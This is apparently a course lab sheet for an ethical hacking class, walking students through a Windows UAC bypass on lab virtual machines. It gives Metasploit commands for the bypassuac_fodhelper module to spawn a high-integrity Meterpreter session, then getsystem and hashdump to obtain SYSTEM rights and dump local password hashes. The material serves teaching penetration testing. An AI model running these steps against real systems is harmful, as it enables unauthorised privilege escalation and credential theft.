# EHPT Lab 11

## Lab 11: Module 1 - UAC via Registry manipulation

#### **1\. Lab Overview &amp; Objectives**

* **Objective**: Understand how User Access Control (UAC) restricts administrative privileges on Windows systems and execute a UAC bypass to escalate process integrity from Medium to High.

* **Learning Outcomes**:
  * Distinguish between Medium Integrity and High Integrity process levels.
  * Enumerate local group memberships and UAC registry settings.
  * Execute a UAC bypass attack using automated frameworks (Metasploit) and manual registry manipulation[4].

#### **2\. Lab Environment & Prerequisites**

* **Attacker VM**: Kali Linux with Metasploit Framework installed[4].
* **Target VM**: Windows 10 metasploitable 3 (or Windows Server) with standard UAC settings enabled.
* **User Account**: Local Administrator account operating in non-elevated (Medium Integrity) mode.

---

### **Step-by-Step Lab Tasks**

#### **Task 1: Initial Reconnaissance &amp; Integrity Level Check**

1. **Check Local Privileges & Groups**:

Through powershell type the following commands and note down the results

```
whoami /priv
whoami /groups

```

1. **Identify Process Integrity Level**:
  * Run `whoami /all` to confirm the current shell is running at **Medium Mandatory Level**.
2. **Verify UAC Registry Settings**:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

```

#### **Task 2: Executing the UAC Bypass**

* **Method A (Automated Metasploit Module)**:
  1. Establish an initial medium-integrity Meterpreter session on Kali[4].
  2. Load and configure the `bypassuac_fodhelper` module:

```
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set LHOST
run

```

#### **Task 3: Post-Exploitation Verification &amp; Cleanup**

1. **Confirm Elevated Privileges**:
  * Run `whoami /all` in the new shell and verify the token is at **High Mandatory Level**.
2. **Access Verification**:
  * Test administrative rights by attempting to read privileged system files or dumping local hashes[3][4].
3. **Remediation &amp; Cleanup**:
  * Clean up added registry keys to restore default security settings.

  ## Lab 11: Module 2 - UAC via bypass exploit modules

 This lab, objectively explores **post-exploitation privilege escalation** by leveraging **Meterpreter local exploit modules** to bypass UAC on a compromised Windows target without triggering an interactive UAC prompt.

**Learning Outcomes:**

* **Understand Mandatory Integrity Levels** (Medium vs. High Mandatory Level) in Windows token security.
* **Enumerate user privileges and UAC registry policies** using Meterpreter and Windows command-line tools.
* **Configure and execute local UAC bypass exploit modules** in Metasploit (`msfconsole`).
* **Perform post-exploitation validation** to confirm elevated administrative token access and execute high-integrity commands.

**Lab Setup & Prerequisites**

* **Attacker Machine**: **Kali Linux** with Metasploit Framework installed.
* **Target Machine**: **Windows 10** Virtual Machine (VM) with UAC enabled at default settings, logged in as a user belonging to the local `Administrators` group.
* **Initial Access Requirement**: An active, non-elevated (Medium Integrity) **Meterpreter session** (`Session 1`) already established on the target VM

**Task 1: Pre-Exploitation Integrity Enumeration**

1. **Check Session Information Privileges**: From your active non-elevated Meterpreter prompt, query basic user and system details:

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getprivs

```

1. **Examine Mandatory Integrity Level**: Open an interactive Windows command shell from Meterpreter:

```
meterpreter > shell

```

Run the following commands to check process integrity and group membership:

```
C:\Windows\system32> whoami /groups
C:\Windows\system32> whoami /priv

```

*Note*: Verify that `Mandatory Label\Medium Mandatory Label` is present, confirming the current process is restricted by UAC.

1. **Verify UAC Registry Configuration**: Check if LUA (Limited User Account / UAC) is enabled on the system:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

```

Exit the Windows command shell to return to Meterpreter:

```
C:\Windows\system32> exit

```

---

**Task 2: Searching &amp; Selecting Metasploit UAC Bypass Modules**

1. **Background the Current Meterpreter Session**:

```
meterpreter > background

```

*Confirm session status with* *sessions -l* *.*

1. **Search for Local UAC Bypass Exploits**: In `msfconsole`, search for available UAC bypass modules:

```
msf6 > search local/bypassuac

```

*Key modules to discuss:*

* `exploit/windows/local/bypassuac_fodhelper` *(Utilizes the auto-elevating* *fodhelper.exe* *binary)*
* `exploit/windows/local/bypassuac_eventvwr` *(Utilizes Event Viewer registry hijacking)*
* `exploit/windows/local/bypassuac_sdclt` *(Utilizes Windows Backup &amp; Restore auto-elevation)*

---

#### **Task 3: Configuring &amp; Running the Meterpreter UAC Bypass**

1. **Select the** **bypassuac\_fodhelper** **Module**:

```
msf6 &gt; use exploit/windows/local/bypassuac_fodhelper

```

1. **Configure Module Options**: Set the session ID of your existing initial Meterpreter shell and configure your payload parameters:

```
msf6 exploit(windows/local/bypassuac_fodhelper) > set SESSION 1
msf6 exploit(windows/local/bypassuac_fodhelper) > set LHOST
msf6 exploit(windows/local/bypassuac\_fodhelper) > set LPORT 4443 
msf6 exploit(windows/local/bypassuac\_fodhelper) > show options

1. **Execute the Exploit**:

```
msf6 exploit(windows/local/bypassuac_fodhelper) > run

```

Upon successful execution, Metasploit will trigger the auto-elevating binary, hijack execution via current-user registry keys, and spawn a **new, high-integrity Meterpreter session** (`Session 2`)

#### **Task 4: Post-Exploitation Integrity & Access Verification**

1. **Interact with the New Elevated Session**:

```
msf6 > sessions -i 2

```

1. **Verify Privileges &amp; Elevated Integrity Level**: Verify that your process now holds elevated tokens:

```
meterpreter > getprivs

```

Drop into a command shell to confirm the token integrity:

```
meterpreter > shell
C:\Windows\system32> whoami /groups

```

*Confirm that* *Mandatory Label\\High Mandatory Label* *is now active*[4]*.*

1. **Demonstrate Administrative Impact**: From the elevated Meterpreter prompt, attempt system-level operations such as dumping local SAM hashes or escalating to `NT AUTHORITY\SYSTEM`[1]:

```
meterpreter > getsystem
meterpreter > hashdump
```